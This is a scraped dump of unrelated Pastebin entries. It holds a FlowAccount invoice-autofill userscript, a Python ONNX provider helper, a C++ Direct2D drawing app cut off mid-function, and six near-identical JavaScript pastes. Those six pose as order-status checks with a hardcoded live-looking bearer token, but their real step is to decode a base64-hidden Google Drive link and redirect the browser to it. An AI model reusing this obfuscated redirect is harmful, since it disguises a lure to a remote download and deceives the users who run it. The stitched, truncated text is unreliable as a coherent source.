// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Displays a list of products with amount and extra inputs in a table and submits selected products where amount > 0. Buttons and selected count are placed outside the table.
// @author       You
// @match        *.flowaccount.com/*/business/invoices*
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function () {
    'use strict';

    // Create the popup container and style it
    GM_addStyle(`
        #select-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border: 2px solid #ccc;
            z-index: 9999;
            display: none;
            width: 700px;
            height: 800px;
            overflow-y: auto;
        }
        #options-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 10px;
        }
        #options-table th, #options-table td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        #options-table th {
            background-color: #f2f2f2;
        }
        .amount-input, .extra-input {
            width: 80px;
            padding: 5px;
            box-sizing: border-box;
        }
        #controls-container {
            position: sticky;
            bottom: 0;
            background: white;
            padding: 10px 0;
            border-top: 1px solid #ccc;
        }
        #selected-count {
            margin-bottom: 10px;
            font-weight: bold;
            font-size: 14px;
            color: #333;
        }
        #submit-selections, #clear-amount, #close-popup {
            margin-right: 10px;
            padding: 5px 10px;
            cursor: pointer;
        }
        #submit-selections:hover {
            background-color: #00cc66;
            color: white;
        }
        #close-popup {
            background: #b71c1c;
            color: white;
            border: none;
        }
        #close-popup:hover {
            background-color: red;
            color: white;
        }
        #clear-amount {
            background: #b71c1c;
            color: white;
            border: none;
        }
        #submit-selections {
            background: green;
            color: white;
            border: none;
        }
        #clear-amount:hover {
            background-color: red;
        }
        #openPopupButton {
            z-index: 99999;
            right: 410px;
            position: fixed;
            padding: 10px 30px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
        }
        #openPopupButton:hover {
            color: white;
            background-color: #45a049;
        }
    `);

    // Create the popup HTML structure
    const popup = document.createElement('div');
    popup.id = 'select-popup';
    popup.innerHTML = `
        <table id=""options-table"">
            <thead>
                <tr>
                    <th>Product</th>
                    <th>Amount</th>
                    <th>Extra</th>
                </tr>
            </thead>
            <tbody id=""options-list""></tbody>
        </table>
        <div id=""controls-container"">
            <div id=""selected-count"">Selected: 0 items | Row: 0 items | Total: 0 items</div>
            <button id=""submit-selections"">Submit</button>
            <button id=""clear-amount"">Clear Amounts</button>
            <button id=""close-popup"">Close</button>
        </div>
    `;
    const openPopupButton = document.createElement('button');
    let lastUrl = location.href;
    const observer = new MutationObserver(() => {
        if (location.href !== lastUrl) {
            lastUrl = location.href;
            onUrlChange();
        }
    });

    observer.observe(document, { subtree: true, childList: true });

    function onUrlChange() {
        if(location.href.includes(""invoices/new"")){
            openPopupButton.style.display = 'block';
        }else{
            openPopupButton.style.display = 'None';
        }
    }

    document.body.appendChild(popup);

    const xpathSelector = '//*[@id=""documentHeader""]/div/div[2]/button'; // '//*[@id=""paper-content""]/section[1]/div[1]/div[3]/fieldset/div[2]/div[3]' //'//*[@id=""documentHeader""]/div/div[2]/button';

    function addButton() {
        // Find the target element using XPath
        const targetElement = document.evaluate(
            xpathSelector,
            document,
            null,
            XPathResult.FIRST_ORDERED_NODE_TYPE,
            null
        ).singleNodeValue;

        if (targetElement) {
            openPopupButton.id = 'openPopupButton';
            openPopupButton.innerText = 'Open Menu';
            openPopupButton.style.borderRadius = '5px';
            //document.body.appendChild(openPopupButton);

            openPopupButton.addEventListener('click', () => {
                popup.style.display = 'block';
            });

            targetElement.parentNode.insertBefore(openPopupButton, targetElement);
            //targetElement.insertAdjacentElement('afterend', openPopupButton);
            onUrlChange();
        }
    }

    // Function to observe the DOM for changes
    function observeDOM() {
        const observer = new MutationObserver(function(mutations) {
            const targetElement = document.evaluate(
                xpathSelector,
                document,
                null,
                XPathResult.FIRST_ORDERED_NODE_TYPE,
                null
            ).singleNodeValue;

            if (targetElement) {
                addButton();
                observer.disconnect();
            }
        });

        observer.observe(document, {
            childList: true,
            subtree: true
        });
    }
    window.addEventListener('load', observeDOM);

    document.getElementById('close-popup').addEventListener('click', () => {
        popup.style.display = 'none';
    });
    document.getElementById('clear-amount').addEventListener('click', () => {
        // Clear all amount and extra input fields
        const amountInputs = document.querySelectorAll('.amount-input');
        const extraInputs = document.querySelectorAll('.extra-input');
        amountInputs.forEach(function(input) {input.value = 0;});
        extraInputs.forEach(function(input) {input.value = 0;});
        updateSelectedCount();
    });

    // Function to simulate typing in an input field
    function simulateTyping(inputElement, value) {
        const event = new Event('input', { 'bubbles': true, 'cancelable': true });
        inputElement.value = value;
        inputElement.dispatchEvent(event);
        inputElement.blur();
    }

    // Function to simulate clicking an input field
    function simulateClick(inputElement) {
        const clickEvent = new MouseEvent('click', { 'bubbles': true, 'cancelable': true });
        inputElement.dispatchEvent(clickEvent);
    }

    // Function to select the first dropdown option
    function selectFirstDropdownOption(inputElement) {
        simulateClick(inputElement);
        setTimeout(() => {
            const dropdownOptions = inputElement.closest('typeahead-custom').querySelectorAll('.tt-suggestion');
            if (dropdownOptions.length > 0) {
                dropdownOptions[0].click();
            }
        }, 1000);
    }

    // Function to process input fields
    document.getElementById('submit-selections').addEventListener('click', () => {
        const selectedProducts = [];
        const amountInputs = document.querySelectorAll('.amount-input');
        const extraInputs = document.querySelectorAll('.extra-input');

        amountInputs.forEach((amountInput, index) => {
            const productName = amountInput.getAttribute('data-product');
            const amountValue = parseInt(amountInput.value, 10) || 0;
            const extraValue = parseInt(extraInputs[index].value, 10) || 0;

            if (amountValue > 0 || extraValue > 0) {
                selectedProducts.push({
                    product: productName,
                    amount: amountValue,
                    extra: extraValue
                });
            }
        });

        if (selectedProducts.length == 0) {
            alert('0 items');
            return;
        }
        popup.style.display = 'None';

        let inputIndex = 1;
        let selectedProductIndex = 0;

        function processNextInput() {
            /*if (selectedProductIndex >= selectedProducts.length) {
                popup.style.display = 'none';
                return;
            }*/

            const selectedProduct = selectedProducts[selectedProductIndex];

            // Skip if amount = 0 and extra = 0
            if (selectedProduct.amount === 0 && selectedProduct.extra === 0) {
                selectedProductIndex++;
                setTimeout(processNextInput, 1000); // Move to the next product
                return;
            }

            const rowXPath = `//*[@id=""not-batch-document-table""]/flowaccount-product-item-table/table/tbody/tr[${inputIndex}]`;
            const inputXPath = `${rowXPath}/td[3]/typeahead-custom/div/div[1]/span/input`;
            const amountXPath = `${rowXPath}/td[4]/input`;
            const priceXPath = `${rowXPath}/td[6]/input`;
            const addButtonXPath = `//*[@id=""paper-content""]/section[2]/div/div/section[1]/button`;

            const productInput = document.evaluate(inputXPath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            const amountInput = document.evaluate(amountXPath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            const priceInput = document.evaluate(priceXPath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            const addButton = document.evaluate(addButtonXPath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;

            if (!productInput) {
                handleMissingProductInput(addButton);
                return;
            }

            if (productInput.value.trim() !== """") {
                inputIndex++;
                setTimeout(processNextInput, 300);
                return;
            }

            // Process main row if amount > 0
            if (selectedProduct.amount > 0) {
                processMainRow(selectedProduct, productInput, amountInput, priceInput, addButton);
            } else if (selectedProduct.extra > 0) {
                processExtraRowOnly(selectedProduct, productInput, amountInput, priceInput, addButton);
            }
        }

        function handleMissingProductInput(addButton) {
            if (addButton) {
                addButton.click();
                setTimeout(processNextInput, 200); // Wait 1 sec before retrying
            } else {
                console.log(""Add button not found!"");
            }
        }

        function processMainRow(selectedProduct, productInput, amountInput, priceInput, addButton) {
            simulateTyping(productInput, selectedProduct.product);
            selectFirstDropdownOption(productInput);

            setTimeout(() => {
                if (amountInput) {
                    simulateTyping(amountInput, selectedProduct.amount);
                    amountInput.focus();
                    const changeEvent = new Event('change', { bubbles: true, cancelable: true });
                    amountInput.dispatchEvent(changeEvent);
                }

                // If extra > 0, add a new row for the extra amount
                if (selectedProduct.extra > 0) {
                    addNewRowForExtra(selectedProduct, addButton);
                } else {
                    selectedProductIndex++;
                    setTimeout(processNextInput, 200); // Move to the next product
                }
            }, 1000); // Wait 1 second before processing amount and price
        }

        function processExtraRowOnly(selectedProduct, productInput, amountInput, priceInput, addButton) {
            simulateTyping(productInput, selectedProduct.product);
            selectFirstDropdownOption(productInput);

            setTimeout(() => {
                if (amountInput) {
                    simulateTyping(amountInput, selectedProduct.extra);
                    amountInput.focus();
                    const changeEvent = new Event('change', { bubbles: true, cancelable: true });
                    amountInput.dispatchEvent(changeEvent);
                }

                // Set price to 0 for the extra row
                if (priceInput) {
                    simulateTyping(priceInput, 0);
                    priceInput.focus();
                    const priceChangeEvent = new Event('change', { bubbles: true, cancelable: true });
                    priceInput.dispatchEvent(priceChangeEvent);
                }

                selectedProductIndex++;
                setTimeout(processNextInput, 200); // Move to the next product
            }, 1000); // Wait 1 second before processing the extra row
        }

        function addNewRowForExtra(selectedProduct, addButton) {
            setTimeout(() => {
                if (addButton) {
                    addButton.click();
                }

                inputIndex++;

                // Process the new row for the extra amount
                setTimeout(() => {
                    const newRowXPath = `//*[@id=""not-batch-document-table""]/flowaccount-product-item-table/table/tbody/tr[${inputIndex}]`;
                    const newProductInput = document.evaluate(`${newRowXPath}/td[3]/typeahead-custom/div/div[1]/span/input`, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
                    const newAmountInput = document.evaluate(`${newRowXPath}/td[4]/input`, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
                    const newPriceInput = document.evaluate(`${newRowXPath}/td[6]/input`, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;

                    if (newProductInput && newAmountInput && newPriceInput) {
                        simulateTyping(newProductInput, selectedProduct.product);
                        selectFirstDropdownOption(newProductInput);

                        setTimeout(() => {
                            simulateTyping(newAmountInput, selectedProduct.extra);
                            newAmountInput.focus();
                            const changeEvent = new Event('change', { bubbles: true, cancelable: true });
                            newAmountInput.dispatchEvent(changeEvent);

                            simulateTyping(newPriceInput, 0);
                            newPriceInput.focus();
                            const priceChangeEvent = new Event('change', { bubbles: true, cancelable: true });
                            newPriceInput.dispatchEvent(priceChangeEvent);

                            selectedProductIndex++;
                            setTimeout(processNextInput, 200); // Move to the next product
                        }, 1000); // Wait 1 second before filling the new row
                    }
                }, 1000); // Wait 1 second before processing the new row
            }, 1000); // Wait 1 second before adding the new row
        }
        processNextInput();
    });

    // Fetch product list from Pastebin and populate UI
    GM_xmlhttpRequest({
        method: ""GET"",
        url: ""https://pastebin.com/raw/dccXXx1L"",
        overrideMimeType: ""text/plain; charset=utf-8"",
        onload: function (response) {
            let rawText = response.responseText;
            let productList = rawText
                .replace(/\r\n/g, ""\n"")
                .split(""\n"")
                .map(item => item.trim())
                .filter(item => item.length > 0);

            const optionsList = document.getElementById('options-list');
            optionsList.innerHTML = """";

            productList.forEach(product => {
                const row = document.createElement('tr');

                const productCell = document.createElement('td');
                productCell.textContent = product;

                const amountCell = document.createElement('td');
                const amountInput = document.createElement('input');
                amountInput.type = 'number';
                amountInput.placeholder = 'Amount';
                amountInput.className = 'amount-input';
                amountInput.min = '0';
                amountInput.value = '0';
                amountInput.setAttribute('data-product', product);
                amountInput.addEventListener('input', updateSelectedCount);
                amountCell.appendChild(amountInput);

                const extraCell = document.createElement('td');
                const extraInput = document.createElement('input');
                extraInput.type = 'number';
                extraInput.placeholder = 'Extra';
                extraInput.className = 'extra-input';
                extraInput.min = '0';
                extraInput.value = '0';
                extraInput.setAttribute('data-product', product);
                extraInput.addEventListener('input', updateSelectedCount);
                extraCell.appendChild(extraInput);

                row.appendChild(productCell);
                row.appendChild(amountCell);
                row.appendChild(extraCell);
                optionsList.appendChild(row);
            });
        },
        onerror: function (error) {
            console.error('Error fetching product list:', error);
        }
    });

    // Function to update selected count
    function updateSelectedCount() {
        const amountInputs = document.querySelectorAll('.amount-input');
        const extraInputs = document.querySelectorAll('.extra-input');

        let selectedCount = 0; // Number of selected items (amount > 0 or extra > 0)
        let rowCount = 0; // Number of rows used (main + extra rows)
        let totalItems = 0; // Total of amount + extra for all selected items

        amountInputs.forEach((amountInput, index) => {
            const amountValue = parseInt(amountInput.value, 10) || 0;
            const extraValue = parseInt(extraInputs[index].value, 10) || 0;

            if (amountValue > 0 || extraValue > 0) {
                selectedCount++; // Count selected items
                totalItems += amountValue + extraValue; // Add to total

                // Count rows:
                // - 1 row for amount > 0
                // - 1 additional row for extra > 0
                if (amountValue > 0) rowCount++;
                if (extraValue > 0) rowCount++;
            }
        });

        // Update the display
        document.getElementById('selected-count').innerText = `Selected: ${selectedCount} items | Row: ${rowCount} items | Total: ${totalItems} items`;
    }
})();"
Da3rhENJ,provider_manager.py,RahulHarpal,Python,Sunday 23rd of March 2025 12:25:05 AM CDT,"# app/utils/provider_manager.py
def get_available_providers():
    """"""Detect and return available execution providers in priority order""""""
    available = onnxruntime.get_available_providers()
    
    # Define provider priority
    provider_priority = [
        ""CUDAExecutionProvider"",      # NVIDIA GPUs
        ""ROCMExecutionProvider"",      # AMD GPUs
        ""CoreMLExecutionProvider"",    # Apple Neural Engine
        ""TensorrtExecutionProvider"",  # TensorRT optimization
        ""CPUExecutionProvider""        # Fallback option
    ]
    
    # Return providers in priority order if available
    return [p for p in provider_priority if p in available]

def get_provider_config(provider_name):
    """"""Return optimized configuration for specific providers""""""
    configs = {
        ""CUDAExecutionProvider"": {
            ""device_id"": 0,
            ""arena_extend_strategy"": ""kNextPowerOfTwo"",
            ""gpu_mem_limit"": 2 * 1024 * 1024 * 1024,
            ""cudnn_conv_algo_search"": ""EXHAUSTIVE""
        },
        ""ROCMExecutionProvider"": {
            ""device_id"": 0,
            ""tunable_op_enable"": True
        },
        ""CoreMLExecutionProvider"": {
            ""enable_on_subgraph"": True
        }
    }
    return configs.get(provider_name, {})"
juMqRUmg,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:24:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/062/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yge14b19,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:18:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/983/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cqxhzJPz,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:12:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/722/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KXzvfvAR,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:07:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/555/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aHxt3Ve3,Untitled,bruhmanuser91roblox,JavaScript,Sunday 23rd of March 2025 12:02:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/453/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fNagBwPQ,Untitled,bruhmanuser91roblox,JavaScript,Saturday 22nd of March 2025 11:56:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/876/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tvavbyhV,Infinite Canvas Doodle Now Using Direct2D /w Hardware Acceleration!!,alien_fx_fiend,C++,Saturday 22nd of March 2025 11:55:14 PM CDT,"==++ Here's the full source of (file 1/1) ""Doodle-D2D-HAcc.cpp""::: ++==
```Doodle-D2D-HAcc.cpp
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <windowsx.h>
#include <commctrl.h>
#include <commdlg.h>
#include <d2d1.h>
#include <dwrite.h>
#include <string>  // add if not already included
#include <cmath>
#include <vector>
#include <mutex>
#include <fstream>
#include <thread>
#include <algorithm>
#include ""resource.h""

#pragma comment(lib, ""d2d1.lib"")
#pragma comment(lib, ""comctl32.lib"")

//----------------------------------------------------------------
// Data Structures and Globals
//----------------------------------------------------------------

struct DrawPoint {
    int x, y;
    DWORD timestamp;
    DrawPoint() : x(0), y(0), timestamp(0) {}
    DrawPoint(int px, int py) : x(px), y(py), timestamp(GetTickCount()) {}
};

struct SerializedStroke {
    std::vector<DrawPoint> points;
    COLORREF color;
    int brushSize;
    bool isEraser;
};

std::mutex strokeMutex;
std::vector<SerializedStroke> strokeHistory;
std::vector<DrawPoint> strokeBuffer;
const double MIN_DISTANCE = 2.0;

COLORREF currentBrushColor = RGB(24, 123, 205);
int brushSize = 10;
bool isDrawing = false;
bool isEraserMode = false;
bool isPaintbrushSelected = true;
bool isSpacePressed = false;
POINT lastMousePos = { 0, 0 };

int scrollX = 0;
int scrollY = 0;
float gridZoomFactor = 1.0f;
bool showGrid = true;
bool useAlphaGrid = false;
int gridOpacity = 255;
const int GRID_SIZE = 100;

HINSTANCE hInst;
HWND hWnd;
//HWND hStatusBar = NULL;
// Global DirectWrite objects:
IDWriteFactory* pDWriteFactory = nullptr;
IDWriteTextFormat* pTextFormat = nullptr;
std::wstring g_statusText = L"""";
// Add DirectWrite globals and a global status string:
//IDWriteFactory* pDWriteFactory = nullptr;
//IDWriteTextFormat* pTextFormat = nullptr;
DWORD lastStatusUpdateTime = 0;
const DWORD STATUS_UPDATE_INTERVAL = 50;
HDC hStatusBufferDC = NULL;
HBITMAP hStatusBufferBitmap = NULL;

// Serialization globals
const wchar_t* STATE_FILE = L""canvas_state2.bin"";
bool isLoading = false;
bool sessionDirty = false;

// For Direct2D
ID2D1Factory* pFactory = nullptr;
ID2D1HwndRenderTarget* pRenderTarget = nullptr;
ID2D1BitmapRenderTarget* pOffscreenRT = nullptr;
bool offscreenDirty = true;
int lastOffscreenScrollX = 0;
int lastOffscreenScrollY = 0;

//----------------------------------------------------------------
// Function Declarations
//----------------------------------------------------------------

void SaveCanvasState();
void LoadCanvasStateAsync(HWND hwnd);
void UpdateStatus(HWND hwnd);
void InitializeStatusBuffer(HWND hStatus);
void UpdateOffscreenBuffer(HWND hwnd);
HRESULT CreateDeviceResources(HWND hwnd);
void DiscardDeviceResources();
void DrawSmoothStroke(ID2D1RenderTarget* pRT, const std::vector<DrawPoint>& points, bool isEraser, COLORREF strokeColor, int strokeSize, int offsetX, int offsetY);
void DrawGrid(ID2D1RenderTarget* pRT, const D2D1_RECT_F& rect);

//----------------------------------------------------------------
// Serialization Functions
//----------------------------------------------------------------

void SaveCanvasState() {
    std::ofstream file(STATE_FILE, std::ios::binary | std::ios::out);
    if (!file)
        return;
    file.write(reinterpret_cast<const char*>(&gridZoomFactor), sizeof(float));
    file.write(reinterpret_cast<const char*>(&showGrid), sizeof(bool));
    file.write(reinterpret_cast<const char*>(&useAlphaGrid), sizeof(bool));
    file.write(reinterpret_cast<const char*>(&gridOpacity), sizeof(int));
    file.write(reinterpret_cast<const char*>(&currentBrushColor), sizeof(COLORREF));
    file.write(reinterpret_cast<const char*>(&brushSize), sizeof(int));
    {
        std::lock_guard<std::mutex> lock(strokeMutex);
        size_t strokeCount = strokeHistory.size();
        file.write(reinterpret_cast<const char*>(&strokeCount), sizeof(size_t));
        for (const auto& stroke : strokeHistory) {
            std::vector<DrawPoint> optimizedPoints;
            if (!stroke.points.empty()) {
                optimizedPoints.push_back(stroke.points[0]);
                for (size_t i = 1; i < stroke.points.size(); ++i) {
                    const DrawPoint& prev = optimizedPoints.back();
                    const DrawPoint& curr = stroke.points[i];
                    double dx = curr.x - prev.x;
                    double dy = curr.y - prev.y;
                    double distance = sqrt(dx * dx + dy * dy);
                    if (distance >= MIN_DISTANCE)
                        optimizedPoints.push_back(curr);
                }
            }
            size_t pointCount = optimizedPoints.size();
            file.write(reinterpret_cast<const char*>(&pointCount), sizeof(size_t));
            if (pointCount > 0)
                file.write(reinterpret_cast<const char*>(optimizedPoints.data()), pointCount * sizeof(DrawPoint));
            file.write(reinterpret_cast<const char*>(&stroke.color), sizeof(COLORREF));
            file.write(reinterpret_cast<const char*>(&stroke.brushSize), sizeof(int));
            file.write(reinterpret_cast<const char*>(&stroke.isEraser), sizeof(bool));
        }
    }
    file.close();
}

void LoadCanvasStateAsync(HWND hwnd) {
    isLoading = true;
    std::thread([hwnd]() {
        std::ifstream file(STATE_FILE, std::ios::binary | std::ios::in);
        if (!file) {
            isLoading = false;
            return;
        }
        try {
            file.read(reinterpret_cast<char*>(&gridZoomFactor), sizeof(float));
            file.read(reinterpret_cast<char*>(&showGrid), sizeof(bool));
            file.read(reinterpret_cast<char*>(&useAlphaGrid), sizeof(bool));
            file.read(reinterpret_cast<char*>(&gridOpacity), sizeof(int));
            file.read(reinterpret_cast<char*>(&currentBrushColor), sizeof(COLORREF));
            file.read(reinterpret_cast<char*>(&brushSize), sizeof(int));
            size_t strokeCount = 0;
            file.read(reinterpret_cast<char*>(&strokeCount), sizeof(size_t));
            std::vector<SerializedStroke> loadedStrokes;
            for (size_t i = 0; i < strokeCount && file.good(); ++i) {
                SerializedStroke stroke;
                size_t pointCount = 0;
                file.read(reinterpret_cast<char*>(&pointCount), sizeof(size_t));
                if (pointCount > 0 && pointCount < 1000000) {
                    for (size_t j = 0; j < pointCount; ++j) {
                        DrawPoint point;
                        file.read(reinterpret_cast<char*>(&point.x), sizeof(int));
                        file.read(reinterpret_cast<char*>(&point.y), sizeof(int));
                        file.read(reinterpret_cast<char*>(&point.timestamp), sizeof(DWORD));
                        stroke.points.push_back(point);
                    }
                    file.read(reinterpret_cast<char*>(&stroke.color), sizeof(COLORREF));
                    file.read(reinterpret_cast<char*>(&stroke.brushSize), sizeof(int));
                    file.read(reinterpret_cast<char*>(&stroke.isEraser), sizeof(bool));
                    loadedStrokes.push_back(stroke);
                }
            }
            {
                std::lock_guard<std::mutex> lock(strokeMutex);
                strokeHistory = std::move(loadedStrokes);
            }
        }
        catch (...) {
            isLoading = false;
            return;
        }
        file.close();
        isLoading = false;
        // Post a message to update offscreen buffer after loading
        PostMessage(hwnd, WM_USER + 1, 0, 0);
        }).detach();
}

//----------------------------------------------------------------
// Direct2D Initialization and Resource Management
//----------------------------------------------------------------

HRESULT CreateDeviceResources(HWND hwnd) {
    if (pRenderTarget)
        return S_OK;
    RECT rc;
    GetClientRect(hwnd, &rc);
    D2D1_SIZE_U size = D2D1::SizeU(rc.right, rc.bottom);

    HRESULT hr = pFactory->CreateHwndRenderTarget(
        D2D1::RenderTargetProperties(),
        D2D1::HwndRenderTargetProperties(hwnd, size),
        &pRenderTarget
    );
    if (SUCCEEDED(hr)) {
        // Create an offscreen compatible render target for persistent drawing.
        hr = pRenderTarget->CreateCompatibleRenderTarget(
            D2D1::SizeF((FLOAT)rc.right, (FLOAT)rc.bottom),
            &pOffscreenRT
        );
        if (SUCCEEDED(hr)) {
            // Mark offscreen as dirty so it is initially updated.
            offscreenDirty = true;
            lastOffscreenScrollX = scrollX;
            lastOffscreenScrollY = scrollY;
        }
    }
    return hr;
}

void DiscardDeviceResources() {
    if (pOffscreenRT) {
        pOffscreenRT->Release();
        pOffscreenRT = nullptr;
    }
    if (pRenderTarget) {
        pRenderTarget->Release();
        pRenderTarget = nullptr;
    }
}

//----------------------------------------------------------------
// Drawing Functions (Direct2D versions)
//----------------------------------------------------------------

void DrawSmoothStroke(ID2D1RenderTarget* pRT, const std::vector<DrawPoint>& points, bool isEraser, COLORREF strokeColor, int strokeSize, int offsetX, int offsetY) {
    if (points.empty())
        return;

    // Determine color; for eraser use white.
    D2D1_COLOR_F color = isEraser ? D2D1::ColorF(D2D1::ColorF::White) :
        D2D1::ColorF(
            GetRValue(strokeColor) / 255.0f,
            GetGValue(strokeColor) / 255.0f,
